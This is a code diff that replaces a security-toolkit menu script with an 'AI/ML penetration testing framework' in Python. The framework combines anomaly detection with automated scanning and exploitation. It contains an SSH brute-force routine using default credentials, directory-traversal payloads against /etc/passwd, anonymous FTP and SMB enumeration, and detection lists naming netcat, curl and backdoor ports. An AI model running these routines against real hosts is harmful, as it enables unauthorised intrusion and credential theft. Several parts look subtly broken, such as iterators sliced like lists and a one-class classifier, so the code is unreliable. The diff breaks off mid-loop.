@@ -1,710 +1,1515 @@
-import argparse
-import time
-import threading
+#!/usr/bin/env python3
+"""
+ABYSSAL SECURITY - AI/ML PENETRATION TESTING FRAMEWORK
+Advanced machine learning threat detection and automated penetration testing
+"""
+
 import os
-import subprocess
 import sys
-import re
+import time
 import json
-from modules.anon import anon_mode
-from modules.scan import scan_mode, fix_mode
-from modules.harden import harden_mode
-from modules.logkiller import logkiller_mode
-from modules.antimitm import antimitm_mode
-from modules.logs import log_info
+import hashlib
+import threading
+import subprocess
+import signal
+import socket
+import pickle
+import numpy as np
+import pandas as pd
+from datetime import datetime
+from pathlib import Path
+from collections import defaultdict, deque
+import re
+import tempfile
+import shutil
+import logging
+from sklearn.ensemble import IsolationForest, RandomForestClassifier
+from sklearn.svm import OneClassSVM
+from sklearn.preprocessing import StandardScaler
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.cluster import DBSCAN
+from sklearn.neural_network import MLPClassifier
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import classification_report, confusion_matrix
+import psutil
+import argparse
 
 # Configuration
-CONFIG_DIR = f"/home/{os.getenv('USER', 'malfoy')}/.config/abyssal"
-os.makedirs(CONFIG_DIR, exist_ok=True)
+CONFIG_DIR = Path.home() / ".config" / "abyssal"
+CONFIG_DIR.mkdir(parents=True, exist_ok=True)
+MODEL_DIR = CONFIG_DIR / "models"
+MODEL_DIR.mkdir(exist_ok=True)
+LOG_DIR = CONFIG_DIR / "logs"
+LOG_DIR.mkdir(exist_ok=True)
 
-def get_feature_state(feature):
-    """Get current state of a feature"""
-    feature_file = f"{CONFIG_DIR}/{feature}-state"
-    try:
-        if os.path.exists(feature_file):
-            with open(feature_file, 'r') as f:
-                return f.read().strip()
-    except:
-        pass
-    return 'on'  # Default to on
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler(LOG_DIR / "abyssal.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-def set_feature_state(feature, state):
-    """Set state of a feature"""
-    feature_file = f"{CONFIG_DIR}/{feature}-state"
-    try:
-        with open(feature_file, 'w') as f:
-            f.write(state)
-        return True
-    except:
-        return False
-
-def clear_screen():
-    """Clear terminal screen"""
-    os.system('clear' if os.name == 'posix' else 'cls')
-
-def run_with_sudo(func, func_name):
-    """Run function with sudo if needed"""
-    sudo_funcs = ['harden_mode', 'logkiller_mode', 'fix_mode', 'antimitm_mode']
+class MLThreatDetector:
+    """Machine Learning Threat Detection Engine"""
     
-    if func_name in sudo_funcs:
-        print(f"⚠️  {func_name.replace('_', ' ').title()} requires sudo")
+    def __init__(self):
+        self.models = {}
+        self.scalers = {}
+        self.feature_extractors = {}
+        self.training_data = []
+        self.threat_history = deque(maxlen=10000)
+        self.baseline_established = False
+        self.load_or_train_models()
+        
+    def load_or_train_models(self):
+        """Load existing models or train new ones"""
         try:
-            result = subprocess.run(['sudo', 'python3', '-c', f'''
-import sys
-sys.path.insert(0, "{os.path.dirname(os.path.abspath(__file__))}")
-from modules.{func_name.replace("_mode", "")} import {func_name}
-{func_name}()
-'''], check=True)
-            return result.returncode == 0
-        except Exception as e:
-            print(f"❌ Failed: {e}")
-            return False
-    else:
+            # Try to load existing models
+            self.load_models()
+            logger.info("Loaded existing ML models")
+        except:
+            logger.info("Training new ML models...")
+            self.train_initial_models()
+            self.save_models()
+    
+    def extract_file_features(self, file_path):
+        """Extract ML features from files"""
+        features = {}
+        
         try:
-            func()
-            return True
-        except Exception as e:
-            print(f"❌ Failed: {e}")
-            return False
-
-def show_banner():
-    """Show ABYSSAL banner"""
-    print("╔══════════════════════════════════════════════════════════════╗")
-    print("║                    ABYSSAL SECURITY                          ║")
-    print("║                 ADVANCED SECURITY TOOLKIT                  ║")
-    print("╚══════════════════════════════════════════════════════════════╝")
-
-def main_menu():
-    """Main interactive menu"""
-    while True:
-        clear_screen()
-        show_banner()
-        
-        # Status bar
-        enabled = sum(1 for f in ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full'] if get_feature_state(f) == 'on')
-        print(f"📊 Active Features: {enabled}/8 | 🕐 {time.strftime('%H:%M:%S')}")
-        print()
-        
-        # Menu options
-        options = [
-            ("1️⃣", "🚀", "Quick Scan", "scan_mode"),
-            ("2️⃣", "🔧", "Deep Scan", "scan_mode"),
-            ("3️⃣", "🛡️", "Fix All Threats", "fix_mode"),
-            ("4️⃣", "👤", "Anonymity Mode", "anon_mode"),
-            ("5️⃣", "🔨", "System Harden", "harden_mode"),
-            ("6️⃣", "🌐", "Anti-MITM", "antimitm_mode"),
-            ("7️⃣", "🧹", "Log Killer", "logkiller_mode"),
-            ("8️⃣", "🔄", "Live Monitor", "start_live_monitoring"),
-            ("9️⃣", "⚙️", "Feature Control", "feature_menu"),
-            ("🔟", "⚙️", "Startup Settings", "startup_menu"),
-            ("1️⃣0️⃣", "🔙", "Exit", "sys.exit")
-        ]
-        
-        # Display menu
-        print("┌─────────────────────────────────────────────────────────────────┐")
-        print("│                    MAIN MENU                             │")
-        print("├─────────────────────────────────────────────────────────────────┤")
-        
-        for i in range(0, len(options), 2):
-            if i + 1 < len(options):
-                opt1, icon1, text1, _ = options[i]
-                opt2, icon2, text2, _ = options[i + 1]
-                print(f"│ {opt1} {icon1} {text1:<18} {opt2} {icon2} {text2:<18} │")
-            else:
-                opt1, icon1, text1, _ = options[i]
-                print(f"│ {opt1} {icon1} {text1:<47} │")
-        
-        print("└─────────────────────────────────────────────────────────────────┘")
-        
-        # Get user choice
-        try:
-            choice = input("⚡ Select option: ").strip()
+            stat = file_path.stat()
             
-            # Map choices to functions
-            choice_map = {
-                '1': ('scan', scan_mode),
-                '2': ('scan', scan_mode),
-                '3': ('fix', fix_mode),
-                '4': ('anon', anon_mode),
-                '5': ('harden', harden_mode),
-                '6': ('antimitm', antimitm_mode),
-                '7': ('logkiller', logkiller_mode),
-                '8': ('live', start_live_monitoring),
-                '9': feature_menu,
-                '10': startup_menu,
-                '0': sys.exit
+            # Basic file features
+            features['size'] = stat.st_size
+            features['mode'] = stat.st_mode
+            features['uid'] = stat.st_uid
+            features['gid'] = stat.st_gid
+            features['mtime'] = stat.st_mtime
+            features['ctime'] = stat.st_ctime
+            features['atime'] = stat.st_atime
+            
+            # Content features
+            try:
+                with open(file_path, 'rb') as f:
+                    content = f.read(8192)  # First 8KB
+                    
+                # Entropy features
+                byte_counts = defaultdict(int)
+                for byte in content:
+                    byte_counts[byte] += 1
+                
+                # Shannon entropy
+                entropy = 0.0
+                if content:
+                    for count in byte_counts.values():
+                        p = count / len(content)
+                        entropy -= p * np.log2(p) if p > 0 else 0
+                
+                features['entropy'] = entropy
+                
+                # Byte frequency features
+                for i in range(256):
+                    features[f'byte_{i}'] = byte_counts.get(i, 0) / len(content) if content else 0
+                
+                # String features
+                try:
+                    text_content = content.decode('utf-8', errors='ignore')
+                    features['text_length'] = len(text_content)
+                    features['unique_chars'] = len(set(text_content))
+                    features['digit_ratio'] = sum(c.isdigit() for c in text_content) / len(text_content) if text_content else 0
+                    features['upper_ratio'] = sum(c.isupper() for c in text_content) / len(text_content) if text_content else 0
+                    features['space_ratio'] = text_content.count(' ') / len(text_content) if text_content else 0
+                    
+                    # Suspicious string patterns
+                    suspicious_patterns = ['password', 'token', 'key', 'secret', 'admin', 'root', 'exploit', 'shell', 'backdoor']
+                    for pattern in suspicious_patterns:
+                        features[f'pattern_{pattern}'] = pattern.lower() in text_content.lower()
+                        
+                except:
+                    features['text_length'] = 0
+                    features['unique_chars'] = 0
+                    features['digit_ratio'] = 0
+                    features['upper_ratio'] = 0
+                    features['space_ratio'] = 0
+                    
+            except Exception as e:
+                logger.debug(f"Error reading file {file_path}: {e}")
+                
+        except Exception as e:
+            logger.debug(f"Error extracting file features {file_path}: {e}")
+            
+        return features
+    
+    def extract_process_features(self, pid):
+        """Extract ML features from processes"""
+        features = {}
+        
+        try:
+            process = psutil.Process(pid)
+            
+            # Basic process features
+            features['pid'] = pid
+            features['ppid'] = process.ppid()
+            features['num_threads'] = process.num_threads()
+            features['create_time'] = process.create_time()
+            
+            # Memory features
+            memory_info = process.memory_info()
+            features['rss'] = memory_info.rss
+            features['vms'] = memory_info.vms
+            features['shared'] = memory_info.shared
+            features['text'] = memory_info.text
+            features['lib'] = memory_info.lib
+            features['data'] = memory_info.data
+            features['dirty'] = memory_info.dirty
+            
+            # CPU features
+            features['cpu_percent'] = process.cpu_percent(interval=0.1)
+            features['cpu_times_user'] = process.cpu_times().user
+            features['cpu_times_system'] = process.cpu_times().system
+            
+            # Network features
+            try:
+                connections = process.connections()
+                features['num_connections'] = len(connections)
+                features['listening_ports'] = len([c for c in connections if c.status == 'LISTEN'])
+                features['established_connections'] = len([c for c in connections if c.status == 'ESTABLISHED'])
+                
+                # Port features
+                ports = [c.laddr.port for c in connections if c.laddr]
+                features['min_port'] = min(ports) if ports else 0
+                features['max_port'] = max(ports) if ports else 0
+                features['mean_port'] = np.mean(ports) if ports else 0
+                
+            except:
+                features['num_connections'] = 0
+                features['listening_ports'] = 0
+                features['established_connections'] = 0
+                features['min_port'] = 0
+                features['max_port'] = 0
+                features['mean_port'] = 0
+            
+            # Command line features
+            cmdline = process.cmdline()
+            features['cmdline_length'] = len(' '.join(cmdline))
+            features['num_args'] = len(cmdline)
+            
+            # Suspicious command patterns
+            cmd_str = ' '.join(cmdline).lower()
+            suspicious_commands = ['nc', 'netcat', 'ssh', 'telnet', 'ftp', 'wget', 'curl', 'python', 'perl', 'ruby', 'bash', 'sh']
+            for cmd in suspicious_commands:
+                features[f'cmd_{cmd}'] = cmd in cmd_str
+                
+            # Parent process features
+            try:
+                parent = process.parent()
+                if parent:
+                    features['parent_name'] = hash(parent.name())
+                    features['parent_cpu'] = parent.cpu_percent(interval=0.1)
+                else:
+                    features['parent_name'] = 0
+                    features['parent_cpu'] = 0
+            except:
+                features['parent_name'] = 0
+                features['parent_cpu'] = 0
+                
+        except Exception as e:
+            logger.debug(f"Error extracting process features {pid}: {e}")
+            
+        return features
+    
+    def extract_network_features(self, connection):
+        """Extract ML features from network connections"""
+        features = {}
+        
+        try:
+            features['status'] = hash(connection.status)
+            features['family'] = connection.family
+            features['type'] = connection.type
+            
+            if connection.laddr:
+                features['local_ip'] = hash(connection.laddr.ip)
+                features['local_port'] = connection.laddr.port
+            else:
+                features['local_ip'] = 0
+                features['local_port'] = 0
+                
+            if connection.raddr:
+                features['remote_ip'] = hash(connection.raddr.ip)
+                features['remote_port'] = connection.raddr.port
+            else:
+                features['remote_ip'] = 0
+                features['remote_port'] = 0
+                
+            # Port category features
+            port_ranges = {
+                'well_known': (0, 1023),
+                'registered': (1024, 49151),
+                'dynamic': (49152, 65535)
             }
             
-            if choice in choice_map:
-                feature, func = choice_map[choice]
-                
-                if callable(func):
-                    if feature and get_feature_state(feature) != 'on':
-                        print(f"\n❌ {feature.upper()} feature is disabled")
-                        input("\n⏸️  Press Enter to continue...")
-                        continue
-                    
-                    print(f"\n🔄 Starting {func.__name__.replace('_', ' ').title()}...")
-                    
-                    if feature in ['scan', 'anon']:
-                        threading.Thread(target=func, daemon=True).start()
-                        time.sleep(1)
-                        input("\n⏸️  Press Enter to continue...")
-                    elif feature == 'live':
-                        func()
-                    else:
-                        success = run_with_sudo(func, func.__name__)
-                        input("\n⏸️  Press Enter to continue...")
+            for range_name, (start, end) in port_ranges.items():
+                if connection.laddr and start <= connection.laddr.port <= end:
+                    features[f'local_port_{range_name}'] = 1
                 else:
-                    func()
-            else:
-                print("\n❌ Invalid option!")
-                input("\n⏸️  Press Enter to continue...")
-                
-        except KeyboardInterrupt:
-            print("\n👋 Goodbye!")
-            return  # Use return instead of return
+                    features[f'local_port_{range_name}'] = 0
+                    
+                if connection.raddr and start <= connection.raddr.port <= end:
+                    features[f'remote_port_{range_name}'] = 1
+                else:
+                    features[f'remote_port_{range_name}'] = 0
+                    
+            # Suspicious port features
+            suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345]
+            for port in suspicious_ports:
+                if connection.laddr and connection.laddr.port == port:
+                    features[f'suspicious_local_{port}'] = 1
+                else:
+                    features[f'suspicious_local_{port}'] = 0
+                    
+                if connection.raddr and connection.raddr.port == port:
+                    features[f'suspicious_remote_{port}'] = 1
+                else:
+                    features[f'suspicious_remote_{port}'] = 0
+                    
         except Exception as e:
-            print(f"\n❌ Error: {e}")
-            input("\n⏸️  Press Enter to continue...")
+            logger.debug(f"Error extracting network features: {e}")
+            
+        return features
+    
+    def train_initial_models(self):
+        """Train initial ML models"""
+        logger.info("Training ML models on system baseline...")
+        
+        # Collect training data from normal system state
+        training_features = []
+        
+        # File system training data
+        logger.info("Collecting file system training data...")
+        for file_path in Path('/').rglob('*')[:1000]:  # Limit to 1000 files
+            try:
+                if file_path.is_file():
+                    features = self.extract_file_features(file_path)
+                    features['type'] = 'file'
+                    features['label'] = 0  # Normal
+                    training_features.append(features)
+            except:
+                continue
+                
+        # Process training data
+        logger.info("Collecting process training data...")
+        for process in psutil.process_iter(['pid']):
+            try:
+                pid = process.info['pid']
+                features = self.extract_process_features(pid)
+                features['type'] = 'process'
+                features['label'] = 0  # Normal
+                training_features.append(features)
+            except:
+                continue
+                
+        # Network training data
+        logger.info("Collecting network training data...")
+        connections = psutil.net_connections()
+        for conn in connections[:500]:  # Limit to 500 connections
+            try:
+                features = self.extract_network_features(conn)
+                features['type'] = 'network'
+                features['label'] = 0  # Normal
+                training_features.append(features)
+            except:
+                continue
+        
+        if training_features:
+            # Convert to DataFrame
+            df = pd.DataFrame(training_features)
+            
+            # Fill NaN values
+            df = df.fillna(0)
+            
+            # Train models for each type
+            for data_type in ['file', 'process', 'network']:
+                type_data = df[df['type'] == data_type]
+                if len(type_data) > 10:
+                    X = type_data.drop(['type', 'label'], axis=1, errors='ignore')
+                    
+                    # Scale features
+                    scaler = StandardScaler()
+                    X_scaled = scaler.fit_transform(X)
+                    
+                    # Train Isolation Forest
+                    iso_forest = IsolationForest(contamination=0.1, random_state=42)
+                    iso_forest.fit(X_scaled)
+                    
+                    # Train One-Class SVM
+                    svm = OneClassSVM(kernel='rbf', gamma='scale', nu=0.1)
+                    svm.fit(X_scaled)
+                    
+                    # Train Random Forest
+                    rf = RandomForestClassifier(n_estimators=100, random_state=42)
+                    rf.fit(X_scaled, [0] * len(X_scaled))  # All normal data
+                    
+                    # Save models
+                    self.models[f'{data_type}_isolation'] = iso_forest
+                    self.models[f'{data_type}_svm'] = svm
+                    self.models[f'{data_type}_random_forest'] = rf
+                    self.scalers[f'{data_type}'] = scaler
+                    
+            self.baseline_established = True
+            logger.info("ML models trained successfully")
+        else:
+            logger.warning("No training data collected")
+    
+    def detect_anomalies(self, features, data_type):
+        """Detect anomalies using trained ML models"""
+        if not self.baseline_established or data_type not in self.scalers:
+            return []
+            
+        try:
+            # Convert to DataFrame
+            df = pd.DataFrame([features])
+            df = df.fillna(0)
+            
+            # Remove non-feature columns
+            feature_cols = [col for col in df.columns if col not in ['type', 'label']]
+            X = df[feature_cols]
+            
+            # Scale features
+            scaler = self.scalers[data_type]
+            X_scaled = scaler.transform(X)
+            
+            anomalies = []
+            
+            # Isolation Forest
+            if f'{data_type}_isolation' in self.models:
+                iso_pred = self.models[f'{data_type}_isolation'].predict(X_scaled)[0]
+                if iso_pred == -1:
+                    anomalies.append("Isolation Forest anomaly")
+                    
+            # One-Class SVM
+            if f'{data_type}_svm' in self.models:
+                svm_pred = self.models[f'{data_type}_svm'].predict(X_scaled)[0]
+                if svm_pred == -1:
+                    anomalies.append("One-Class SVM anomaly")
+                    
+            # Random Forest
+            if f'{data_type}_random_forest' in self.models:
+                rf_pred = self.models[f'{data_type}_random_forest'].predict(X_scaled)[0]
+                rf_proba = self.models[f'{data_type}_random_forest'].predict_proba(X_scaled)[0]
+                if rf_pred == 1 or max(rf_proba) < 0.5:
+                    anomalies.append(f"Random Forest anomaly (confidence: {max(rf_proba):.2f})")
+                    
+            return anomalies
+            
+        except Exception as e:
+            logger.debug(f"Error in anomaly detection: {e}")
+            return []
+    
+    def analyze_file_with_ml(self, file_path):
+        """Analyze file using ML models"""
+        features = self.extract_file_features(file_path)
+        anomalies = self.detect_anomalies(features, 'file')
+        
+        threats = []
+        if anomalies:
+            threats.append(f"ML File Anomaly: {file_path} - {'; '.join(anomalies)}")
+            
+        return threats
+    
+    def analyze_process_with_ml(self, pid):
+        """Analyze process using ML models"""
+        features = self.extract_process_features(pid)
+        anomalies = self.detect_anomalies(features, 'process')
+        
+        threats = []
+        if anomalies:
+            try:
+                process = psutil.Process(pid)
+                threats.append(f"ML Process Anomaly: {process.name()} (PID {pid}) - {'; '.join(anomalies)}")
+            except:
+                threats.append(f"ML Process Anomaly: PID {pid} - {'; '.join(anomalies)}")
+                
+        return threats
+    
+    def analyze_network_with_ml(self, connection):
+        """Analyze network connection using ML models"""
+        features = self.extract_network_features(connection)
+        anomalies = self.detect_anomalies(features, 'network')
+        
+        threats = []
+        if anomalies:
+            threats.append(f"ML Network Anomaly: {connection} - {'; '.join(anomalies)}")
+            
+        return threats
+    
+    def save_models(self):
+        """Save trained ML models"""
+        try:
+            for name, model in self.models.items():
+                model_path = MODEL_DIR / f"{name}.pkl"
+                with open(model_path, 'wb') as f:
+                    pickle.dump(model, f)
+                    
+            for name, scaler in self.scalers.items():
+                scaler_path = MODEL_DIR / f"{name}_scaler.pkl"
+                with open(scaler_path, 'wb') as f:
+                    pickle.dump(scaler, f)
+                    
+            logger.info("ML models saved successfully")
+        except Exception as e:
+            logger.error(f"Error saving models: {e}")
+    
+    def load_models(self):
+        """Load trained ML models"""
+        try:
+            # Load models
+            for model_file in MODEL_DIR.glob("*.pkl"):
+                if not model_file.name.endswith("_scaler.pkl"):
+                    with open(model_file, 'rb') as f:
+                        model = pickle.load(f)
+                        self.models[model_file.stem] = model
+                        
+            # Load scalers
+            for scaler_file in MODEL_DIR.glob("*_scaler.pkl"):
+                with open(scaler_file, 'rb') as f:
+                    scaler = pickle.load(f)
+                    self.scalers[scaler_file.stem.replace("_scaler", "")] = scaler
+                    
+            self.baseline_established = True
+            logger.info("ML models loaded successfully")
+        except Exception as e:
+            logger.error(f"Error loading models: {e}")
+            raise
 
-def feature_menu():
-    """Feature control menu"""
-    while True:
-        clear_screen()
+class PenetrationTestingFramework:
+    """Automated Penetration Testing Framework"""
+    
+    def __init__(self):
+        self.ml_detector = MLThreatDetector()
+        self.target_systems = []
+        self.exploit_database = self.load_exploit_database()
+        self.vulnerability_scanner = VulnerabilityScanner()
+        
+    def load_exploit_database(self):
+        """Load exploit database"""
+        # This would typically load from a real exploit database
+        # For demo purposes, we'll use a simplified version
+        return {
+            'ssh_brute_force': {
+                'description': 'SSH brute force attack',
+                'ports': [22],
+                'protocols': ['ssh'],
+                'severity': 'high'
+            },
+            'ftp_anonymous': {
+                'description': 'FTP anonymous login check',
+                'ports': [21],
+                'protocols': ['ftp'],
+                'severity': 'medium'
+            },
+            'web_directory_traversal': {
+                'description': 'Web directory traversal',
+                'ports': [80, 443, 8080],
+                'protocols': ['http', 'https'],
+                'severity': 'high'
+            },
+            'smb_vulnerability': {
+                'description': 'SMB vulnerability scan',
+                'ports': [445],
+                'protocols': ['smb'],
+                'severity': 'high'
+            }
+        }
+    
+    def scan_network_range(self, network_range):
+        """Scan network range for targets"""
+        targets = []
+        
+        # Simple network scanning (would use nmap in production)
+        try:
+            # Parse network range (simplified)
+            if '-' in network_range:
+                start_ip, end_ip = network_range.split('-')
+                # Generate IP range (simplified)
+                for i in range(1, 255):
+                    ip = f"192.168.1.{i}"
+                    if self.ping_host(ip):
+                        targets.append({
+                            'ip': ip,
+                            'hostname': self.get_hostname(ip),
+                            'open_ports': self.scan_ports(ip),
+                            'services': self.identify_services(ip)
+                        })
+        except Exception as e:
+            logger.error(f"Network scan error: {e}")
+            
+        return targets
+    
+    def ping_host(self, ip):
+        """Check if host is up"""
+        try:
+            result = subprocess.run(['ping', '-c', '1', ip], capture_output=True, text=True, timeout=2)
+            return result.returncode == 0
+        except:
+            return False
+    
+    def get_hostname(self, ip):
+        """Get hostname for IP"""
+        try:
+            hostname = socket.gethostbyaddr(ip)[0]
+            return hostname
+        except:
+            return ip
+    
+    def scan_ports(self, ip, ports=None):
+        """Scan ports on target"""
+        if ports is None:
+            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
+            
+        open_ports = []
+        
+        for port in ports:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((ip, port))
+                if result == 0:
+                    open_ports.append(port)
+                sock.close()
+            except:
+                continue
+                
+        return open_ports
+    
+    def identify_services(self, ip):
+        """Identify services on open ports"""
+        services = {}
+        open_ports = self.scan_ports(ip)
+        
+        for port in open_ports:
+            try:
+                service = socket.getservbyport(port)
+                services[port] = service
+            except:
+                services[port] = 'unknown'
+                
+        return services
+    
+    def test_vulnerabilities(self, target):
+        """Test target for vulnerabilities"""
+        vulnerabilities = []
+        
+        for port, service in target['services'].items():
+            # Check exploit database
+            for exploit_name, exploit_info in self.exploit_database.items():
+                if port in exploit_info['ports'] and service in exploit_info['protocols']:
+                    vulnerabilities.append({
+                        'target': target['ip'],
+                        'port': port,
+                        'service': service,
+                        'exploit': exploit_name,
+                        'description': exploit_info['description'],
+                        'severity': exploit_info['severity']
+                    })
+        
+        return vulnerabilities
+    
+    def exploit_target(self, target, exploit):
+        """Attempt to exploit target"""
+        results = {
+            'target': target['ip'],
+            'exploit': exploit,
+            'success': False,
+            'details': []
+        }
+        
+        try:
+            if exploit == 'ssh_brute_force':
+                results.update(self.ssh_brute_force(target))
+            elif exploit == 'ftp_anonymous':
+                results.update(self.ftp_anonymous_check(target))
+            elif exploit == 'web_directory_traversal':
+                results.update(self.web_directory_traversal(target))
+            elif exploit == 'smb_vulnerability':
+                results.update(self.smb_vulnerability_check(target))
+                
+        except Exception as e:
+            results['details'].append(f"Exploitation error: {e}")
+            
+        return results
+    
+    def ssh_brute_force(self, target):
+        """SSH brute force attack"""
+        results = {'success': False, 'details': []}
+        
+        # Common credentials (simplified for demo)
+        credentials = [
+            ('root', 'root'), ('admin', 'admin'), ('user', 'user'),
+            ('root', 'password'), ('admin', 'password'), ('user', 'password')
+        ]
+        
+        for username, password in credentials:
+            try:
+                # Use ssh to test credentials (simplified)
+                cmd = f"ssh -o ConnectTimeout=5 -o BatchMode=no {username}@{target['ip']} 'echo test'"
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, 
+                                      input=f"{password}\n", shell=True)
+                
+                if result.returncode == 0:
+                    results['success'] = True
+                    results['details'].append(f"SSH login successful: {username}:{password}")
+                    break
+                else:
+                    results['details'].append(f"SSH login failed: {username}:{password}")
+                    
+            except Exception as e:
+                results['details'].append(f"SSH test error: {e}")
+                
+        return results
+    
+    def ftp_anonymous_check(self, target):
+        """Check for anonymous FTP access"""
+        results = {'success': False, 'details': []}
+        
+        try:
+            import ftplib
+            ftp = ftplib.FTP(target['ip'], timeout=5)
+            ftp.login('anonymous', 'anonymous@example.com')
+            results['success'] = True
+            results['details'].append("Anonymous FTP access successful")
+            ftp.quit()
+        except Exception as e:
+            results['details'].append(f"Anonymous FTP access failed: {e}")
+            
+        return results
+    
+    def web_directory_traversal(self, target):
+        """Test for web directory traversal"""
+        results = {'success': False, 'details': []}
+        
+        # Common directory traversal payloads
+        payloads = [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            '....//....//....//etc/passwd'
+        ]
+        
+        for port in [80, 443, 8080]:
+            if port in target['open_ports']:
+                protocol = 'https' if port == 443 else 'http'
+                for payload in payloads:
+                    try:
+                        url = f"{protocol}://{target['ip']}:{port}/{payload}"
+                        response = subprocess.run(['curl', '-s', '--max-time', '5', url], 
+                                              capture_output=True, text=True)
+                        
+                        if 'root:' in response.stdout or 'localhost' in response.stdout:
+                            results['success'] = True
+                            results['details'].append(f"Directory traversal successful: {url}")
+                            break
+                            
+                    except Exception as e:
+                        results['details'].append(f"Directory traversal test error: {e}")
+                        
+        return results
+    
+    def smb_vulnerability_check(self, target):
+        """Check for SMB vulnerabilities"""
+        results = {'success': False, 'details': []}
+        
+        try:
+            # Use smbclient to check SMB (simplified)
+            cmd = f"smbclient -L //{target['ip']} -N"
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, shell=True)
+            
+            if result.returncode == 0:
+                results['success'] = True
+                results['details'].append("SMB share enumeration successful")
+                results['details'].append(f"Shares: {result.stdout}")
+            else:
+                results['details'].append("SMB share enumeration failed")
+                
+        except Exception as e:
+            results['details'].append(f"SMB check error: {e}")
+            
+        return results
+    
+    def comprehensive_penetration_test(self, target_range):
+        """Run comprehensive penetration test"""
+        logger.info(f"Starting penetration test on {target_range}")
+        
+        # Phase 1: Reconnaissance
+        targets = self.scan_network_range(target_range)
+        logger.info(f"Found {len(targets)} targets")
+        
+        # Phase 2: Vulnerability Assessment
+        all_vulnerabilities = []
+        for target in targets:
+            vulns = self.test_vulnerabilities(target)
+            all_vulnerabilities.extend(vulns)
+            
+        logger.info(f"Found {len(all_vulnerabilities)} vulnerabilities")
+        
+        # Phase 3: Exploitation
+        exploit_results = []
+        for vuln in all_vulnerabilities:
+            target = next(t for t in targets if t['ip'] == vuln['target'])
+            result = self.exploit_target(target, vuln['exploit'])
+            exploit_results.append(result)
+            
+        successful_exploits = [r for r in exploit_results if r['success']]
+        logger.info(f"Successfully exploited {len(successful_exploits)} targets")
+        
+        return {
+            'targets': targets,
+            'vulnerabilities': all_vulnerabilities,
+            'exploits': exploit_results,
+            'summary': {
+                'total_targets': len(targets),
+                'total_vulnerabilities': len(all_vulnerabilities),
+                'successful_exploits': len(successful_exploits)
+            }
+        }
+
+class VulnerabilityScanner:
+    """Advanced vulnerability scanner"""
+    
+    def __init__(self):
+        self.cve_database = self.load_cve_database()
+        
+    def load_cve_database(self):
+        """Load CVE database (simplified)"""
+        return {
+            'CVE-2021-44228': {
+                'description': 'Log4j Remote Code Execution',
+                'affected_services': ['apache', 'log4j'],
+                'severity': 'critical'
+            },
+            'CVE-2021-34527': {
+                'description': 'PrintNightmare Windows Print Spooler',
+                'affected_services': ['print spooler'],
+                'severity': 'critical'
+            }
+        }
+    
+    def scan_for_vulnerabilities(self, target):
+        """Scan target for known vulnerabilities"""
+        vulnerabilities = []
+        
+        # Check services against CVE database
+        for port, service in target['services'].items():
+            for cve_id, cve_info in self.cve_database.items():
+                if any(affected in service.lower() for affected in cve_info['affected_services']):
+                    vulnerabilities.append({
+                        'cve_id': cve_id,
+                        'description': cve_info['description'],
+                        'service': service,
+                        'port': port,
+                        'severity': cve_info['severity']
+                    })
+                    
+        return vulnerabilities
+
+class AbyssalSecurity:
+    """Main AI/ML Security Application"""
+    
+    def __init__(self):
+        self.ml_detector = MLThreatDetector()
+        self.config_file = CONFIG_DIR / "config.json"
+        self.load_config()
+        
+    def load_config(self):
+        """Load configuration settings"""
+        default_config = {
+            "real_time_monitoring": True,
+            "scan_interval": 15,
+            "alert_sound": True,
+            "ml_detection": True,
+            "anonymity_mode": False,
+            "auto_quarantine": False,
+            "log_level": "INFO"
+        }
+        
+        try:
+            if self.config_file.exists():
+                with open(self.config_file, 'r') as f:
+                    self.config = json.load(f)
+            else:
+                self.config = default_config
+                self.save_config()
+        except:
+            self.config = default_config
+    
+    def save_config(self):
+        """Save configuration settings"""
+        try:
+            with open(self.config_file, 'w') as f:
+                json.dump(self.config, f, indent=2)
+        except Exception as e:
+            logger.error(f"Failed to save config: {e}")
+    
+    def show_banner(self):
+        """Display application banner"""
         print("╔══════════════════════════════════════════════════════════════╗")
-        print("║                   FEATURE CONTROL                           ║")
+        print("║          ABYSSAL SECURITY - AI/ML PENETRATION TESTING       ║")
+        print("║        Advanced Machine Learning Threat Detection Framework    ║")
         print("╚══════════════════════════════════════════════════════════════╝")
         print()
+    
+    def ml_real_time_monitor(self):
+        """ML-powered real-time monitoring"""
+        print("🤖 AI/ML REAL-TIME MONITORING ACTIVE")
+        print("🧠 Machine Learning threat detection engine running...")
+        print("🔍 Scanning with Isolation Forest, One-Class SVM, and Random Forest")
+        print("⚡ Press Ctrl+C to stop monitoring")
+        print("=" * 70)
         
-        features = ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full']
+        alert_count = 0
         
-        print("📊 CURRENT STATUS:")
-        print("┌─────────────────────────────────────────────────────────────────┐")
+        while True:
+            try:
+                timestamp = datetime.now().strftime("%H:%M:%S")
+                print(f"\n[{timestamp}] 🤖 ML Scanning for anomalies...")
+                
+                all_threats = []
+                
+                # ML File System Analysis
+                print("  📁 ML File System Analysis...")
+                for file_path in Path('/tmp').rglob('*')[:50]:  # Limit for performance
+                    try:
+                        threats = self.ml_detector.analyze_file_with_ml(file_path)
+                        all_threats.extend(threats)
+                    except:
+                        continue
+                
+                # ML Process Analysis
+                print("  🔧 ML Process Analysis...")
+                for process in psutil.process_iter(['pid'])[:50]:  # Limit for performance
+                    try:
+                        pid = process.info['pid']
+                        threats = self.ml_detector.analyze_process_with_ml(pid)
+                        all_threats.extend(threats)
+                    except:
+                        continue
+                
+                # ML Network Analysis
+                print("  🌐 ML Network Analysis...")
+                connections = psutil.net_connections()[:50]  # Limit for performance
+                for conn in connections:
+                    try:
+                        threats = self.ml_detector.analyze_network_with_ml(conn)
+                        all_threats.extend(threats)
+                    except:
+                        continue
+                
+                if all_threats:
+                    alert_count += len(all_threats)
